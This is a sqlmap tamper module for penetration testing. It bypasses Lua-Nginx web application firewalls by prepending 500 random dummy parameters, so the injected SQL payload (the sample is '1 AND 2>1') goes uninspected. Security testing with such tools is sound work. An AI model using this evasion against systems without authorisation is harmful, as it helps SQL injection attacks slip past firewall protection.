#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import random
import string

from lib.core.compat import xrange
from lib.core.enums import HINT
from lib.core.enums import PRIORITY
from lib.core.settings import DEFAULT_GET_POST_DELIMITER

__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    """
    LUA-Nginx WAFs Bypass (e.g. Cloudflare)

    Reference:
        * https://opendatasecurity.io/cloudflare-vulnerability-allows-waf-be-disabled/

    Notes:
        * Lua-Nginx WAFs do not support processing of more than 100 parameters

    >>> random.seed(0); hints={}; payload = tamper("1 AND 2>1", hints=hints); "%s&%s" % (hints[HINT.PREPEND], payload)
    '34=&Xe=&90=&Ni=&rW=&lc=&te=&T4=&zO=&NY=&B4=&hM=&X2=&pU=&D8=&hm=&p0=&7y=&18=&RK=&Xi=&5M=&vM=&hO=&bg=&5c=&b8=&dE=&7I=&5I=&90=&R2=&BK=&bY=&p4=&lu=&po=&Vq=&bY=&3c=&ps=&Xu=&lK=&3Q=&7s=&pq=&1E=&rM=&FG=&vG=&Xy=&tQ=&lm=&rO=&pO=&rO=&1M=&vy=&La=&xW=&f8=&du=&94=&vE=&9q=&bE=&lQ=&JS=&NQ=&fE=&RO=&FI=&zm=&5A=&lE=&DK=&x8=&RQ=&Xw=&LY=&5S=&zi=&Js=&la=&3I=&r8=&re=&Xe=&5A=&3w=&vs=&zQ=&1Q=&HW=&Bw=&Xk=&LU=&Lk=&1E=&Nw=&pm=&ns=&zO=&xq=&7k=&v4=&F6=&Pi=&vo=&zY=&vk=&3w=&tU=&nW=&TG=&NM=&9U=&p4=&9A=&T8=&Xu=&xa=&Jk=&nq=&La=&lo=&zW=&xS=&v0=&Z4=&vi=&Pu=&jK=&DE=&72=&fU=&DW=&1g=&RU=&Hi=&li=&R8=&dC=&nI=&9A=&tq=&1w=&7u=&rg=&pa=&7c=&zk=&rO=&xy=&ZA=&1K=&ha=&tE=&RC=&3m=&r2=&Vc=&B6=&9A=&Pk=&Pi=&zy=&lI=&pu=&re=&vS=&zk=&RE=&xS=&Fs=&x8=&Fe=&rk=&Fi=&Tm=&fA=&Zu=&DS=&No=&lm=&lu=&li=&jC=&Do=&Tw=&xo=&zQ=&nO=&ng=&nC=&PS=&fU=&Lc=&Za=&Ta=&1y=&lw=&pA=&ZW=&nw=&pM=&pa=&Rk=&lE=&5c=&T4=&Vs=&7W=&Jm=&xG=&nC=&Js=&xM=&Rg=&zC=&Dq=&VA=&Vy=&9o=&7o=&Fk=&Ta=&Fq=&9y=&vq=&rW=&X4=&1W=&hI=&nA=&hs=&He=&No=&vy=&9C=&ZU=&t6=&1U=&1Q=&Do=&bk=&7G=&nA=&VE=&F0=&BO=&l2=&BO=&7o=&zq=&B4=&fA=&lI=&Xy=&Ji=&lk=&7M=&JG=&Be=&ts=&36=&tW=&fG=&T4=&vM=&hG=&tO=&VO=&9m=&Rm=&LA=&5K=&FY=&HW=&7Q=&t0=&3I=&Du=&Xc=&BS=&N0=&x4=&fq=&jI=&Ze=&TQ=&5i=&T2=&FQ=&VI=&Te=&Hq=&fw=&LI=&Xq=&LC=&B0=&h6=&TY=&HG=&Hw=&dK=&ru=&3k=&JQ=&5g=&9s=&HQ=&vY=&1S=&ta=&bq=&1u=&9i=&DM=&DA=&TG=&vQ=&Nu=&RK=&da=&56=&nm=&vE=&Fg=&jY=&t0=&DG=&9o=&PE=&da=&D4=&VE=&po=&nm=&lW=&X0=&BY=&NK=&pY=&5Q=&jw=&r0=&FM=&lU=&da=&ls=&Lg=&D8=&B8=&FW=&3M=&zy=&ho=&Dc=&HW=&7E=&bM=&Re=&jk=&Xe=&JC=&vs=&Ny=&D4=&fA=&DM=&1o=&9w=&3C=&Rw=&Vc=&Ro=&PK=&rw=&Re=&54=&xK=&VK=&1O=&1U=&vg=&Ls=&xq=&NA=&zU=&di=&BS=&pK=&bW=&Vq=&BC=&l6=&34=&PE=&JG=&TA=&NU=&hi=&T0=&Rs=&fw=&FQ=&NQ=&Dq=&Dm=&1w=&PC=&j2=&r6=&re=&t2=&Ry=&h2=&9m=&nw=&X4=&vI=&rY=&1K=&7m=&7g=&J8=&Pm=&RO=&7A=&fO=&1w=&1g=&7U=&7Y=&hQ=&FC=&vu=&Lw=&5I=&t0=&Na=&vk=&Te=&5S=&ZM=&Xs=&Vg=&tE=&J2=&Ts=&Dm=&Ry=&FC=&7i=&h8=&3y=&zk=&5G=&NC=&Pq=&ds=&zK=&d8=&zU=&1a=&d8=&Js=&nk=&TQ=&tC=&n8=&Hc=&Ru=&H0=&Bo=&XE=&Jm=&xK=&r2=&Fu=&FO=&NO=&7g=&PC=&Bq=&3O=&FQ=&1o=&5G=&zS=&Ps=&j0=&b0=&RM=&DQ=&RQ=&zY=&nk=&1 AND 2>1'
    """

    hints = kwargs.get("hints", {})
    delimiter = kwargs.get("delimiter", DEFAULT_GET_POST_DELIMITER)

    hints[HINT.PREPEND] = delimiter.join("%s=" % "".join(random.sample(string.ascii_letters + string.digits, 2)) for _ in xrange(500))

    return payload
